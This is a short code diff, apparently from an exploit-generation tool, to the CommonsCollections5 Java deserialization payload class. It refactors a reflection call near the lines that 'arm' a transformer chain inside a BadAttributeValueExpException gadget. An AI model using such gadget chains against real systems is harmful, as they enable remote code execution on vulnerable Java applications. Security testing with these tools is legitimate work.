@@ -81,7 +81,7 @@ public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<
 
 		BadAttributeValueExpException val = new BadAttributeValueExpException(null);
 		Field valfield = val.getClass().getDeclaredField("val");
-		valfield.setAccessible(true);
+        Reflections.setAccessible(valfield);
 		valfield.set(val, entry);
 
 		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
